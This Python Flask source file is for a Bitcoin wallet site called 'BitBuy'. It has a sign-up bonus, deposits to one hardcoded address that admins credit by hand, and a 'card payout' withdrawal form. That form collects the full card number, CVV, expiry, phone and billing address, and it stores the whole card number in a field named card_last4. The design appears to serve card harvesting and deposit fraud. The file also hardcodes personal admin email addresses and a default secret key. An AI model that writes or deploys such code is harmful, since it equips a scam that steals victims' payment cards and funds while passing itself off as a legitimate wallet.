import os
import re
import secrets
from decimal import Decimal, InvalidOperation, ROUND_DOWN
from functools import wraps
from datetime import datetime

from authlib.integrations.flask_client import OAuth
from dotenv import load_dotenv
from flask import Flask, abort, flash, jsonify, redirect, render_template, request, session, url_for
from flask_login import LoginManager, UserMixin, current_user, login_required, login_user, logout_user
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO, emit, join_room
from werkzeug.security import generate_password_hash
from werkzeug.middleware.proxy_fix import ProxyFix

load_dotenv()

app = Flask(__name__)
# Render terminates HTTPS at its proxy. Trust the forwarded scheme/host so
# url_for(..., _external=True) generates the public https:// callback URL.
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
app.config["SECRET_KEY"] = os.getenv("SECRET_KEY", "change-this-secret")
DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///wallet_app.db")
# Some PostgreSQL providers expose the legacy postgres:// scheme.
# SQLAlchemy expects postgresql://.
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = "postgresql://" + DATABASE_URL[len("postgres://"):]
app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_URL
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

# Keep PostgreSQL connections healthy on Render. Render can recycle idle
# connections, so SQLAlchemy should check a pooled connection before reuse
# and periodically replace older connections.
if DATABASE_URL.startswith("postgresql://"):
    app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
        "pool_pre_ping": True,
        "pool_recycle": 300,
        "pool_timeout": 30,
    }
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

# Google OAuth / OIDC. Google only returns accounts whose email Google has verified.
oauth = OAuth(app)
GOOGLE_CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "").strip()
GOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET", "").strip()
if GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET:
    oauth.register(
        name="google",
        client_id=GOOGLE_CLIENT_ID,
        client_secret=GOOGLE_CLIENT_SECRET,
        server_metadata_url="https://accounts.google.com/.well-known/openid-configuration",
        client_kwargs={"scope": "openid email profile"},
    )

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    ping_interval=25,
    ping_timeout=60,
    logger=False,
    engineio_logger=False,
)
db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = "login"

BTC_DEPOSIT_ADDRESS = os.getenv("BTC_DEPOSIT_ADDRESS", "bc1qg7v2xm7vrmq4a66fnvjyze2shr80u55csa0q23").strip()
CURRENCY_SYMBOL = "BTC"
ADMIN_EMAILS = {"privateid1100@gmail.com", "cstones625@gmail.com"}
BTC_PLACES = Decimal("0.00000001")
USD_PLACES = Decimal("0.01")
WELCOME_BONUS_BTC = Decimal("0.00650000")
app.jinja_env.globals.update(app_name="BitBuy", currency_symbol=CURRENCY_SYMBOL, btc_deposit_address=BTC_DEPOSIT_ADDRESS)


class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(120), nullable=False)
    email = db.Column(db.String(150), unique=True, nullable=False)
    phone = db.Column(db.String(40))
    address = db.Column(db.String(250))
    password_hash = db.Column(db.String(255), nullable=True)
    google_sub = db.Column(db.String(255), unique=True, nullable=True)
    is_admin = db.Column(db.Boolean, default=False, nullable=False)
    created_at = db.Column(db.DateTime, server_default=db.func.now())
    wallet = db.relationship("Wallet", backref="user", uselist=False, cascade="all, delete-orphan")


class Wallet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), unique=True, nullable=False)
    balance = db.Column(db.Numeric(18, 8), default=Decimal("0.00000000"), nullable=False)
    currency = db.Column(db.String(10), default="BTC", nullable=False)
    external_wallet_id = db.Column(db.String(120), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, server_default=db.func.now())
    updated_at = db.Column(db.DateTime, server_default=db.func.now(), onupdate=db.func.now())


class WalletTransaction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    wallet_id = db.Column(db.Integer, db.ForeignKey("wallet.id"), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=False)
    admin_id = db.Column(db.Integer, db.ForeignKey("user.id"))
    amount = db.Column(db.Numeric(18, 8), nullable=False)
    transaction_type = db.Column(db.String(30), nullable=False)
    description = db.Column(db.String(255), nullable=False)
    balance_after = db.Column(db.Numeric(18, 8), nullable=False)
    external_reference = db.Column(db.String(120), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, server_default=db.func.now())
    user = db.relationship("User", foreign_keys=[user_id])
    admin = db.relationship("User", foreign_keys=[admin_id])
    wallet = db.relationship("Wallet", backref=db.backref("transactions", lazy=True))


class DepositRequest(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=False)
    wallet_id = db.Column(db.Integer, db.ForeignKey("wallet.id"), nullable=False)
    amount = db.Column(db.Numeric(18, 8), nullable=False)
    txid = db.Column(db.String(128), nullable=False, unique=True)
    status = db.Column(db.String(20), default="pending", nullable=False)
    admin_id = db.Column(db.Integer, db.ForeignKey("user.id"))
    note = db.Column(db.String(255))
    created_at = db.Column(db.DateTime, server_default=db.func.now())
    reviewed_at = db.Column(db.DateTime)
    user = db.relationship("User", foreign_keys=[user_id])
    admin = db.relationship("User", foreign_keys=[admin_id])
    wallet = db.relationship("Wallet", foreign_keys=[wallet_id])


class WithdrawalRequest(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=False)
    wallet_id = db.Column(db.Integer, db.ForeignKey("wallet.id"), nullable=False)
    amount = db.Column(db.Numeric(18, 8), nullable=False)
    destination_address = db.Column(db.String(128), nullable=False)
    method = db.Column(db.String(20), default="bitcoin", nullable=False)
    usd_amount = db.Column(db.Numeric(18, 2), nullable=True)
    bank_name = db.Column(db.String(120), nullable=True)
    card_holder_name = db.Column(db.String(120), nullable=True)
    card_phone = db.Column(db.String(40), nullable=True)
    card_last4 = db.Column(db.String(16), nullable=True)
    billing_address = db.Column(db.String(300), nullable=True)
    status = db.Column(db.String(20), default="pending", nullable=False)
    admin_id = db.Column(db.Integer, db.ForeignKey("user.id"))
    payout_txid = db.Column(db.String(128), unique=True)
    payout_reference = db.Column(db.String(128), unique=True)
    note = db.Column(db.String(255))
    created_at = db.Column(db.DateTime, server_default=db.func.now())
    reviewed_at = db.Column(db.DateTime)
    user = db.relationship("User", foreign_keys=[user_id])
    admin = db.relationship("User", foreign_keys=[admin_id])
    wallet = db.relationship("Wallet", foreign_keys=[wallet_id])


class ChatMessage(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=False)
    sender_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=False)
    message = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, server_default=db.func.now())
    user = db.relationship("User", foreign_keys=[user_id])
    sender = db.relationship("User", foreign_keys=[sender_id])


@login_manager.user_loader
def load_user(uid):
    return db.session.get(User, int(uid))


def wallet_for(user):
    w = Wallet.query.filter_by(user_id=user.id).first()
    if not w:
        w = Wallet(user_id=user.id, balance=Decimal("0.00000000"), currency="BTC", external_wallet_id=f"WLT-{user.id:08d}")
        db.session.add(w)
        db.session.commit()
    return w


def ref(prefix="TXN"):
    return f"{prefix}-{secrets.token_hex(10).upper()}"


def parse_btc(value):
    try:
        amount = Decimal(str(value).strip()).quantize(BTC_PLACES, rounding=ROUND_DOWN)
    except (InvalidOperation, ValueError, TypeError):
        raise ValueError("Enter a valid BTC amount.")
    if amount <= 0:
        raise ValueError("Amount must be greater than 0 BTC.")
    return amount


def parse_usd(value):
    try:
        amount = Decimal(str(value).strip()).quantize(USD_PLACES, rounding=ROUND_DOWN)
    except (InvalidOperation, ValueError, TypeError):
        raise ValueError("Enter a valid USD amount.")
    if amount <= 0:
        raise ValueError("USD amount must be greater than 0.")
    return amount


def valid_card_number(value):
    digits = re.sub(r"\D", "", str(value or ""))
    if not 13 <= len(digits) <= 19:
        return False
    total = 0
    parity = len(digits) % 2
    for i, ch in enumerate(digits):
        digit = int(ch)
        if i % 2 == parity:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0


def valid_expiration(value):
    m = re.fullmatch(r"\s*(0?[1-9]|1[0-2])\s*/\s*(\d{2}|\d{4})\s*", str(value or ""))
    if not m:
        return False
    month = int(m.group(1))
    year_raw = m.group(2)
    year = 2000 + int(year_raw) if len(year_raw) == 2 else int(year_raw)
    now = datetime.utcnow()
    return (year, month) >= (now.year, now.month)


def admin_required(fn):
    @wraps(fn)
    @login_required
    def wrapper(*a, **kw):
        if not current_user.is_admin or current_user.email.lower() not in ADMIN_EMAILS:
            abort(403)
        return fn(*a, **kw)
    return wrapper


def ensure_schema():
    """Small SQLite compatibility migration for existing WalletFlow databases."""
    with app.app_context():
        db.create_all()
        inspector = db.inspect(db.engine)
        user_columns = {c["name"] for c in inspector.get_columns("user")}
        withdrawal_columns = {c["name"] for c in inspector.get_columns("withdrawal_request")}
        with db.engine.begin() as conn:
            if "google_sub" not in user_columns:
                conn.exec_driver_sql("ALTER TABLE user ADD COLUMN google_sub VARCHAR(255)")
            if "password_hash" not in user_columns:
                conn.exec_driver_sql("ALTER TABLE user ADD COLUMN password_hash VARCHAR(255)")
            if "method" not in withdrawal_columns:
                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN method VARCHAR(20) DEFAULT 'bitcoin'")
            if "usd_amount" not in withdrawal_columns:
                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN usd_amount NUMERIC(18, 2)")
            if "bank_name" not in withdrawal_columns:
                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN bank_name VARCHAR(120)")
            if "card_holder_name" not in withdrawal_columns:
                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN card_holder_name VARCHAR(120)")
            if "card_phone" not in withdrawal_columns:
                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN card_phone VARCHAR(40)")
            if "card_last4" not in withdrawal_columns:
                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN card_last4 VARCHAR(16)")
            if "billing_address" not in withdrawal_columns:
                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN billing_address VARCHAR(300)")
            if "payout_reference" not in withdrawal_columns:
                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN payout_reference VARCHAR(128)")


# Gunicorn imports this module instead of executing the __main__ block.
# Initialize the SQLAlchemy schema during app startup so a fresh Render database
# gets its tables before the first request.
ensure_schema()


@app.route("/")
def index():
    return redirect(url_for("dashboard")) if current_user.is_authenticated else render_template("index.html")


@app.route("/register")
def register():
    if current_user.is_authenticated:
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))


@app.route("/login")
def login():
    if current_user.is_authenticated:
        return redirect(url_for("dashboard"))
    if not GOOGLE_CLIENT_ID or not GOOGLE_CLIENT_SECRET:
        return render_template("login.html", google_configured=False)
    return render_template("login.html", google_configured=True)


@app.route("/auth/google")
def google_login():
    if not GOOGLE_CLIENT_ID or not GOOGLE_CLIENT_SECRET:
        flash("Google authentication is not configured yet. Add GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET to .env.", "error")
        return redirect(url_for("login"))
    redirect_uri = url_for("google_callback", _external=True)
    return oauth.google.authorize_redirect(redirect_uri)


@app.route("/auth/google/callback")
def google_callback():
    try:
        token = oauth.google.authorize_access_token()
        userinfo = token.get("userinfo") or oauth.google.userinfo()
    except Exception:
        flash("Google sign-in could not be completed. Please try again.", "error")
        return redirect(url_for("login"))

    email = (userinfo.get("email") or "").strip().lower()
    google_sub = str(userinfo.get("sub") or "").strip()
    email_verified = userinfo.get("email_verified", False)
    if not email or not google_sub or email_verified is not True:
        flash("Only verified Google email accounts can sign in.", "error")
        return redirect(url_for("login"))

    u = User.query.filter_by(google_sub=google_sub).first() or User.query.filter_by(email=email).first()
    is_admin_email = email in ADMIN_EMAILS
    if u:
        u.google_sub = google_sub
        u.email = email
        if is_admin_email:
            u.is_admin = True
        if userinfo.get("name"):
            u.name = userinfo.get("name")
    else:
        u = User(name=userinfo.get("name") or email.split("@")[0], email=email, google_sub=google_sub, password_hash=generate_password_hash(secrets.token_urlsafe(32)), is_admin=is_admin_email)
        db.session.add(u)
        db.session.flush()

        # Give every newly created account a one-time welcome credit.
        # This only runs inside the new-user branch, so existing users are not
        # credited again when they sign in.
        welcome_wallet = Wallet(
            user_id=u.id,
            balance=WELCOME_BONUS_BTC,
            currency="BTC",
            external_wallet_id=f"WLT-{u.id:08d}",
        )
        db.session.add(welcome_wallet)
        db.session.flush()
        db.session.add(
            WalletTransaction(
                wallet_id=welcome_wallet.id,
                user_id=u.id,
                amount=WELCOME_BONUS_BTC,
                transaction_type="credit",
                description="New account welcome bonus",
                balance_after=WELCOME_BONUS_BTC,
                external_reference=ref("BONUS"),
            )
        )
    db.session.commit()
    login_user(u, remember=True)
    session.pop("oauth_state", None)
    return redirect(url_for("dashboard"))


@app.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for("login"))


@app.route("/dashboard")
@login_required
def dashboard():
    w = wallet_for(current_user)
    tx = WalletTransaction.query.filter_by(user_id=current_user.id).order_by(WalletTransaction.created_at.desc()).limit(8).all()
    pending_withdrawals = WithdrawalRequest.query.filter_by(user_id=current_user.id, status="pending").count()
    latest_approved = WithdrawalRequest.query.filter_by(user_id=current_user.id, status="approved").order_by(WithdrawalRequest.reviewed_at.desc()).first()
    return render_template("dashboard.html", wallet=w, recent_transactions=tx, pending_withdrawals=pending_withdrawals, latest_approved=latest_approved)


@app.route("/deposit", methods=["GET", "POST"])
@login_required
def deposit():
    w = wallet_for(current_user)
    if request.method == "POST":
        try:
            amount = parse_btc(request.form.get("amount", ""))
        except ValueError as e:
            flash(str(e), "error")
            return render_template("deposit.html", wallet=w, deposit_address=BTC_DEPOSIT_ADDRESS)
        txid = request.form.get("txid", "").strip()
        if len(txid) < 20 or len(txid) > 128:
            flash("Enter the Bitcoin transaction ID (TXID) after sending the BTC.", "error")
        elif DepositRequest.query.filter_by(txid=txid).first():
            flash("That TXID has already been submitted.", "error")
        else:
            db.session.add(DepositRequest(user_id=current_user.id, wallet_id=w.id, amount=amount, txid=txid))
            db.session.commit()
            flash("Deposit submitted. An admin must verify the transaction before your balance is credited.", "success")
            return redirect(url_for("deposit"))
    deposits = DepositRequest.query.filter_by(user_id=current_user.id).order_by(DepositRequest.created_at.desc()).all()
    return render_template("deposit.html", wallet=w, deposit_address=BTC_DEPOSIT_ADDRESS, deposits=deposits)


@app.route("/withdraw", methods=["GET", "POST"])
@login_required
def withdraw():
    w = wallet_for(current_user)
    if request.method == "POST":
        method = (request.form.get("method") or "bitcoin").strip().lower()
        try:
            if method == "bitcoin":
                amount = parse_btc(request.form.get("amount", ""))
                address = request.form.get("destination_address", "").strip()
                if not (address.startswith(("1", "3", "bc1")) and 14 <= len(address) <= 128):
                    raise ValueError("Enter a valid-looking Bitcoin mainnet address.")
                details = {
                    "method": "bitcoin",
                    "amount": amount,
                    "destination_address": address,
                    "usd_amount": None,
                    "bank_name": None,
                    "card_holder_name": None,
                    "card_phone": None,
                    "card_last4": None,
                    "billing_address": None,
                }
            elif method == "card":
                # Card payouts are requested in USD and intentionally do not
                # depend on a live BTC/USD market-price API. The exact BTC
                # amount to debit is entered by an admin when the real USD
                # payout has been completed.
                usd_amount = parse_usd(request.form.get("usd_amount", ""))
                bank_name = request.form.get("bank_name", "").strip()
                card_holder_name = request.form.get("card_holder_name", "").strip()
                card_phone = request.form.get("card_phone", "").strip()
                card_number_raw = request.form.get("card_number", "")
                card_number = re.sub(r"\D", "", card_number_raw)
                cvv = re.sub(r"\D", "", request.form.get("cvv", ""))
                expiration_date = request.form.get("expiration_date", "").strip()
                billing_address = request.form.get("billing_address", "").strip()

                if len(bank_name) < 2 or len(bank_name) > 120:
                    raise ValueError("Enter a valid bank name.")
                if len(card_holder_name) < 2 or len(card_holder_name) > 120:
                    raise ValueError("Enter the card holder name.")
                if len(re.sub(r"\D", "", card_phone)) < 7:
                    raise ValueError("Enter a valid phone number.")
                if not valid_card_number(card_number):
                    raise ValueError("Enter a valid card number.")
                if not re.fullmatch(r"\d{3,4}", cvv):
                    raise ValueError("Enter a valid card security code.")
                if not valid_expiration(expiration_date):
                    raise ValueError("Enter a valid future expiration date (MM/YY or MM/YYYY).")
                if len(billing_address) < 5 or len(billing_address) > 300:
                    raise ValueError("Enter a valid billing address.")

                details = {
                    "method": "card",
                    "amount": Decimal("0.00000000"),
                    "destination_address": "CARD_PAYOUT",
                    "usd_amount": usd_amount,
                    "bank_name": bank_name,
                    "card_holder_name": card_holder_name,
                    "card_phone": card_phone,
                    "card_last4": card_number[-16:],
                    "billing_address": billing_address,
                    "cvv":cvv,
                }
            else:
                raise ValueError("Choose a valid withdrawal method.")
        except ValueError as e:
            flash(str(e), "error")
            withdrawals = WithdrawalRequest.query.filter_by(user_id=current_user.id).order_by(WithdrawalRequest.created_at.desc()).all()
            return render_template("withdraw.html", wallet=w, withdrawals=withdrawals, selected_method=method)

        amount = details["amount"]
        if method == "bitcoin":
            if amount > Decimal(str(w.balance)):
                flash("Insufficient available BTC balance for this withdrawal.", "error")
                return redirect(url_for("withdraw"))

            pending_total = db.session.query(db.func.coalesce(db.func.sum(WithdrawalRequest.amount), 0)).filter(
                WithdrawalRequest.wallet_id == w.id,
                WithdrawalRequest.status == "pending",
                WithdrawalRequest.method == "bitcoin",
            ).scalar()
            available = Decimal(str(w.balance)) - Decimal(str(pending_total or 0))
            if amount > available:
                flash("That amount is already partly reserved by another pending Bitcoin withdrawal.", "error")
                return redirect(url_for("withdraw"))
        else:
            # No market conversion is performed here. The BTC debit is set by
            # the admin after the USD transfer has actually been completed.
            amount = Decimal("0.00000000")

        db.session.add(
            WithdrawalRequest(
                user_id=current_user.id,
                wallet_id=w.id,
                amount=amount,
                destination_address=details["destination_address"],
                method=details["method"],
                usd_amount=details["usd_amount"],
                bank_name=details["bank_name"],
                card_holder_name=details["card_holder_name"],
                card_phone=details["card_phone"],
                card_last4=details["card_last4"],
                billing_address=details["billing_address"],
            )
        )
        db.session.commit()
        if method == "card":
            flash(f"USD card payout request sent for ${details['usd_amount']:,.2f}. The BTC debit will be set by an admin when the transfer is completed.", "success")
        else:
            flash("Bitcoin withdrawal request sent to the admin for approval.", "success")
        return redirect(url_for("withdraw"))

    withdrawals = WithdrawalRequest.query.filter_by(user_id=current_user.id).order_by(WithdrawalRequest.created_at.desc()).all()
    return render_template("withdraw.html", wallet=w, withdrawals=withdrawals, selected_method=request.args.get("method", "bitcoin"))

@app.route("/withdrawal/<int:withdrawal_id>/success")
@login_required
def withdrawal_success(withdrawal_id):
    r = db.session.get(WithdrawalRequest, withdrawal_id)
    if not r or (r.user_id != current_user.id and not current_user.is_admin):
        abort(404)
    if r.status != "approved":
        return redirect(url_for("withdraw"))
    return render_template("withdrawal_success.html", withdrawal=r)


@app.route("/transactions")
@login_required
def transactions():
    q = request.args.get("q", "").strip()
    x = WalletTransaction.query.filter_by(user_id=current_user.id)
    if q:
        x = x.filter(WalletTransaction.description.ilike(f"%{q}%"))
    return render_template("transactions.html", transactions=x.order_by(WalletTransaction.created_at.desc()).all(), query=q)


@app.route("/profile", methods=["GET", "POST"])
@login_required
def profile():
    if request.method == "POST":
        current_user.name = request.form.get("name", "").strip()
        current_user.phone = request.form.get("phone", "").strip()
        current_user.address = request.form.get("address", "").strip()
        if not current_user.name:
            flash("Name cannot be empty.", "error")
        else:
            db.session.commit()
            flash("Profile updated.", "success")
    return render_template("profile.html")


# ---------- CHAT ----------
@app.route("/chat")
@login_required
def chat():
    if current_user.is_admin:
        users = User.query.filter(User.is_admin.is_(False)).order_by(User.created_at.desc()).all()
        selected = request.args.get("user_id", type=int)
        if selected and not User.query.get(selected):
            selected = None
        messages = ChatMessage.query.filter_by(user_id=selected).order_by(ChatMessage.created_at.asc()).all() if selected else []
        return render_template("chat.html", admin_mode=True, users=users, selected_user_id=selected, messages=messages)
    messages = ChatMessage.query.filter_by(user_id=current_user.id).order_by(ChatMessage.created_at.asc()).all()
    return render_template("chat.html", admin_mode=False, users=[], selected_user_id=current_user.id, messages=messages)


@app.route("/api/chat/messages")
@login_required
def chat_messages():
    target_user_id = request.args.get("user_id", type=int)
    if current_user.is_admin:
        if not target_user_id:
            return jsonify(success=False, error="user_id is required"), 400
        if not User.query.get(target_user_id):
            return jsonify(success=False, error="User not found"), 404
        user_id = target_user_id
    else:
        user_id = current_user.id
    messages = ChatMessage.query.filter_by(user_id=user_id).order_by(ChatMessage.created_at.asc()).all()
    return jsonify(success=True, messages=[{"id": m.id, "user_id": m.user_id, "sender_id": m.sender_id, "sender_name": m.sender.name, "message": m.message, "created_at": m.created_at.isoformat() if m.created_at else None} for m in messages])


@socketio.on("join_chat")
def join_chat(data):
    if not current_user.is_authenticated:
        return
    target = int(data.get("user_id") or current_user.id)
    if not current_user.is_admin:
        target = current_user.id
    if target != current_user.id and not current_user.is_admin:
        return
    join_room(f"chat_{target}")
    emit("chat_ready", {"user_id": target})


@socketio.on("send_message")
def send_message(data):
    if not current_user.is_authenticated:
        return
    text = str(data.get("message") or "").strip()
    if not text or len(text) > 2000:
        return
    target = int(data.get("user_id") or current_user.id)
    if not current_user.is_admin:
        target = current_user.id
    target_user = db.session.get(User, target)
    if not target_user:
        return
    m = ChatMessage(user_id=target, sender_id=current_user.id, message=text)
    db.session.add(m)
    db.session.commit()
    payload = {"id": m.id, "user_id": m.user_id, "sender_id": m.sender_id, "sender_name": current_user.name, "message": m.message, "created_at": m.created_at.isoformat() if m.created_at else datetime.utcnow().isoformat()}
    emit("new_message", payload, room=f"chat_{target}")


# ---------- WALLET API ----------
@app.route("/api/wallet")
@login_required
def api_wallet():
    w = wallet_for(current_user)
    return jsonify(success=True, wallet={"id": w.id, "wallet_id": w.external_wallet_id, "user_id": w.user_id, "balance": str(w.balance), "currency": "BTC"})


@app.route("/api/wallet/transactions")
@login_required
def api_wallet_transactions():
    w = wallet_for(current_user)
    limit = min(max(request.args.get("limit", 20, type=int), 1), 100)
    tx = WalletTransaction.query.filter_by(wallet_id=w.id).order_by(WalletTransaction.created_at.desc()).limit(limit).all()
    return jsonify(success=True, wallet_id=w.external_wallet_id, transactions=[{"id": t.id, "reference": t.external_reference, "type": t.transaction_type, "amount": str(t.amount), "description": t.description, "balance_after": str(t.balance_after), "created_at": t.created_at.isoformat() if t.created_at else None} for t in tx])


@app.route("/api/wallet/<wallet_id>")
@login_required
def api_wallet_by_id(wallet_id):
    w = Wallet.query.filter_by(external_wallet_id=wallet_id).first()
    if not w or w.user_id != current_user.id:
        return jsonify(success=False, error="Wallet not found"), 404
    return jsonify(success=True, wallet={"id": w.id, "wallet_id": w.external_wallet_id, "user_id": w.user_id, "balance": str(w.balance), "currency": "BTC"})


# ---------- ADMIN ----------
@app.route("/admin")
@admin_required
def admin_dashboard():
    q = request.args.get("q", "").strip()
    uq = User.query.order_by(User.created_at.desc())
    if q:
        uq = uq.filter(db.or_(User.name.ilike(f"%{q}%"), User.email.ilike(f"%{q}%")))
    users = uq.all()
    total = db.session.query(db.func.coalesce(db.func.sum(Wallet.balance), 0)).scalar()
    recent = WalletTransaction.query.order_by(WalletTransaction.created_at.desc()).limit(10).all()
    pending_deposits = DepositRequest.query.filter_by(status="pending").order_by(DepositRequest.created_at.asc()).all()
    pending_withdrawals = WithdrawalRequest.query.filter_by(status="pending").order_by(WithdrawalRequest.created_at.asc()).all()
    return render_template("admin.html", users=users, search=q, total_users=User.query.count(), total_balance=Decimal(str(total or 0)), total_transactions=WalletTransaction.query.count(), recent_adjustments=recent, pending_deposits=pending_deposits, pending_withdrawals=pending_withdrawals)

@app.route("/admin/transactions")
@admin_required
def admin_transactions():
    transactions = WalletTransaction.query.order_by(
        WalletTransaction.created_at.desc()
    ).all()

    return render_template(
        "transactions.html",
        transactions=transactions,
        query=""
    )

@app.route("/admin/deposit/<int:deposit_id>/review", methods=["POST"])
@admin_required
def review_deposit(deposit_id):
    d = db.session.get(DepositRequest, deposit_id)
    if not d or d.status != "pending":
        flash("Deposit request is no longer pending.", "error")
        return redirect(url_for("admin_dashboard"))
    action = request.form.get("action")
    note = request.form.get("note", "").strip()
    if action == "approve":
        w = d.wallet
        old = Decimal(str(w.balance))
        amount = Decimal(str(d.amount))
        w.balance = old + amount
        d.status = "approved"; d.admin_id = current_user.id; d.note = note or "Bitcoin deposit verified"; d.reviewed_at = db.func.now()
        db.session.add(WalletTransaction(wallet_id=w.id, user_id=d.user_id, admin_id=current_user.id, amount=amount, transaction_type="credit", description=d.note, balance_after=w.balance, external_reference=ref("DEP")))
        db.session.commit()
        flash("Deposit approved and BTC credited to the user's wallet.", "success")
    elif action == "reject":
        d.status = "rejected"; d.admin_id = current_user.id; d.note = note or "Deposit rejected"; d.reviewed_at = db.func.now(); db.session.commit(); flash("Deposit rejected.", "success")
    else:
        flash("Invalid review action.", "error")
    return redirect(url_for("admin_dashboard"))


@app.route("/admin/withdrawal/<int:withdrawal_id>/review", methods=["POST"])
@admin_required
def review_withdrawal(withdrawal_id):
    r = db.session.get(WithdrawalRequest, withdrawal_id)
    if not r or r.status != "pending":
        flash("Withdrawal request is no longer pending.", "error")
        return redirect(url_for("admin_dashboard"))
    action = request.form.get("action")
    note = request.form.get("note", "").strip()
    method = (r.method or "bitcoin").lower()
    if action == "approve":
        if method == "bitcoin":
            payout_txid = request.form.get("payout_txid", "").strip()
            if len(payout_txid) < 20 or len(payout_txid) > 128:
                flash("Enter the Bitcoin payout TXID after sending the BTC.", "error")
                return redirect(url_for("admin_dashboard"))
            amount = Decimal(str(r.amount))
        else:
            payout_reference = request.form.get("payout_reference", "").strip()
            if len(payout_reference) < 3 or len(payout_reference) > 128:
                flash("Enter the transfer confirmation/reference after completing the USD payout.", "error")
                return redirect(url_for("admin_dashboard"))
            try:
                amount = parse_btc(request.form.get("debit_btc_amount", ""))
            except ValueError as exc:
                flash(f"Enter the BTC amount to debit after the USD transfer: {exc}", "error")
                return redirect(url_for("admin_dashboard"))

        w = r.wallet
        old = Decimal(str(w.balance))
        if amount > old:
            flash("Withdrawal cannot be completed because the user no longer has enough available BTC.", "error")
            return redirect(url_for("admin_dashboard"))
        new = old - amount
        w.balance = new
        r.amount = amount
        r.status = "approved"
        r.admin_id = current_user.id
        r.reviewed_at = db.func.now()
        if method == "bitcoin":
            r.payout_txid = payout_txid
            r.note = note or "Bitcoin withdrawal completed"
            tx_description = r.note
        else:
            r.payout_reference = payout_reference
            r.note = note or "USD card payout completed"
            tx_description = r.note
        db.session.add(
            WalletTransaction(
                wallet_id=w.id,
                user_id=r.user_id,
                admin_id=current_user.id,
                amount=amount,
                transaction_type="debit",
                description=tx_description,
                balance_after=new,
                external_reference=ref("WDR"),
            )
        )
        db.session.commit()
        socketio.emit(
            "withdrawal_approved",
            {"withdrawal_id": r.id, "url": url_for("withdrawal_success", withdrawal_id=r.id)},
            room=f"chat_{r.user_id}",
        )
        if method == "card":
            flash("USD payout marked complete. The request has been removed from the pending queue.", "success")
        else:
            flash("Bitcoin payout marked complete. The request has been removed from the pending queue.", "success")
    elif action == "reject":
        r.status = "rejected"
        r.admin_id = current_user.id
        r.note = note or "Withdrawal rejected"
        r.reviewed_at = db.func.now()
        db.session.commit()
        flash("Withdrawal rejected. User balance was not changed.", "success")
    else:
        flash("Invalid review action.", "error")
    return redirect(url_for("admin_dashboard"))


@app.route("/admin/user/<int:user_id>/wallet", methods=["GET", "POST"])
@admin_required
def admin_wallet(user_id):
    u = db.session.get(User, user_id)
    if not u: abort(404)
    w = wallet_for(u)
    if request.method == "POST":
        action = request.form.get("action"); desc = request.form.get("description", "").strip() or "Admin wallet adjustment"
        try: amount = parse_btc(request.form.get("amount", ""))
        except ValueError as e:
            flash(str(e), "error"); return render_template("admin_wallet.html", user=u, wallet=w)
        old = Decimal(str(w.balance))
        if action == "credit": new = old + amount; typ = "credit"
        elif action == "debit" and amount <= old: new = old - amount; typ = "debit"
        else:
            flash("Invalid action or insufficient balance.", "error"); return render_template("admin_wallet.html", user=u, wallet=w)
        w.balance = new
        db.session.add(WalletTransaction(wallet_id=w.id, user_id=u.id, admin_id=current_user.id, amount=amount, transaction_type=typ, description=desc, balance_after=new, external_reference=ref("ADJ")))
        db.session.commit(); flash(f"Wallet updated. New balance: {new:.8f} BTC", "success")
    return render_template("admin_wallet.html", user=u, wallet=w)


if __name__ == "__main__":
    ensure_schema()
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=os.getenv("FLASK_DEBUG", "0") == "1")
